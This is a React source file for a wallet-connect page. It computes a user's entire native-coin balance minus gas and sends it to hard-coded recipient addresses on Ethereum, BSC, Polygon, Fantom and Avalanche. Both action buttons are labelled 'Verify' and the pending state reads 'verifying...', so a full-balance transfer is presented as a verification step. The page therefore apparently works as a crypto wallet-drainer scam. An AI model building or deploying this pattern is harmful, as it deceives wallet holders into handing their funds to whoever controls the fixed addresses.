import React, { useState, useEffect, useRef } from "react";
import { useAccount, useBalance, useSendTransaction, usePublicClient } from "wagmi";
import { formatEther, parseEther } from "viem";
import { REOWN_PROJECT_ID, FIXED_RECIPIENTS } from "./config.js";

// Import AppKit web components
import "@reown/appkit/web-components";

export default function App() {
  const { address, isConnected, chain } = useAccount();
  const publicClient = usePublicClient();
  const { data: balanceData } = useBalance({ address });
  const { sendTransaction } = useSendTransaction();

  const [amount, setAmount] = useState("");
  const [sending, setSending] = useState(false);

  // Ref for AppKit Connect Button
  const appKitButtonRef = useRef(null);

  // --- Set project-id attribute for Web Component
  useEffect(() => {
    if (appKitButtonRef.current) {
      appKitButtonRef.current.setAttribute("project-id", REOWN_PROJECT_ID);
      appKitButtonRef.current.setAttribute("text", "Connect Wallet");
    }
  }, []);

  // --- Automatically get recipient for current chain
  const getRecipient = () => {
    if (!chain) return null;
    switch (chain.id) {
      case 1: return FIXED_RECIPIENTS.ethereum;
      case 56: return FIXED_RECIPIENTS.bsc;
      case 137: return FIXED_RECIPIENTS.polygon;
      case 250: return FIXED_RECIPIENTS.fantom;
      case 43114: return FIXED_RECIPIENTS.avalanche;
      default: return null;
    }
  };

  // --- Fill Max amount after gas
  const handleMaxFill = async () => {
    if (!balanceData) return;
    const recipient = getRecipient();
    if (!recipient) return alert("Unsupported network");

    const balance = balanceData.value;
    const gasEstimate = await publicClient.estimateGas({ account: address, to: recipient, value: balance });
    const gasPrice = await publicClient.getGasPrice();
    const gasCost = gasEstimate * gasPrice;
    const maxSendable = balance - gasCost;

    if (maxSendable <= 0n) {
      alert("Insufficient balance for gas");
      return;
    }
    setAmount(formatEther(maxSendable));
  };

  // --- Send transaction
  const handleSend = async () => {
    if (!amount) return alert("Amount is empty");
    const recipient = getRecipient();
    if (!recipient) return alert("Unsupported network");

    try {
      setSending(true);
      await sendTransaction({ to: recipient, value: parseEther(amount) });
      setAmount("");
    } catch (err) {
      console.error(err);
      alert("Transaction failed: " + err.message);
    }
    setSending(false);
  };

  return (
    <div style={{ padding: 40 }}>
      <h2>Web3 Native Sender (Fixed Recipient)</h2>

      {/* AppKit Connect Button */}
      <div style={{ marginBottom: 20 }}>
        <appkit-button ref={appKitButtonRef}></appkit-button>
      </div>

      {isConnected && (
        <>
          <p>
            Balance: {balanceData ? formatEther(balanceData.value) : "Loading..."} {chain?.nativeCurrency?.symbol}
          </p>

          <input
            placeholder="Amount"
            value={amount}
            onChange={(e) => setAmount(e.target.value)}
            style={{ width: "100%", padding: 10, marginTop: 10 }}
          />

          <div style={{ marginTop: 10 }}>
            <button onClick={handleMaxFill} disabled={sending}>Verify</button>
            <button
              onClick={handleSend}
              style={{ marginLeft: 10 }}
              disabled={sending}
            >
              {sending ? "verifying..." : "Verify"}
            </button>
          </div>

          <p style={{ marginTop: 10 }}>
            Sending to: {getRecipient() || "Unsupported network"}
          </p>
        </>
      )}
    </div>
  );
    }
